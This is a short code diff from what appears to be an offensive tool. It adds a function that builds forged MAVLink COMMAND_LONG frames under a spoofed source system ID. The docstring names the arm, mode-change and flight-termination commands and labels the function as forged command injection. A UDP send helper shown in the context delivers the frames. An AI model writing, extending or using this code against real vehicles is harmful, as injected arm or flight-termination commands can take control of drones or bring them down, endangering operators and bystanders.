@@ -56,6 +56,20 @@ def build_mavlink_mission_item_frame(seq: int, lat_e7: int, lon_e7: int, alt_m: 
             {"seq": seq, "lat_e7": lat_e7, "lon_e7": lon_e7}).encode()
 
 
+def build_mavlink_command_frame(cmd_id: int, params, target_sysid: int = 1):
+    """COMMAND_LONG 프레임(arm=400/mode=176/flight_term=185 등). 위조 명령 주입."""
+    p = (list(params) + [0.0] * 7)[:7]
+    try:
+        from pymavlink import mavutil
+        mav = mavutil.mavlink.MAVLink(None)
+        mav.srcSystem = 245
+        msg = mav.command_long_encode(target_sysid, 1, cmd_id, 0,
+                                      p[0], p[1], p[2], p[3], p[4], p[5], p[6])
+        return msg.pack(mav)
+    except Exception:
+        return b"MAVLINK_COMMAND_LONG:" + json.dumps({"cmd": cmd_id, "params": p}).encode()
+
+
 def udp_deliver(host, port, payload: bytes) -> int:
     """UDP 데이터그램 송신. 반환: 송신 바이트 수."""
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
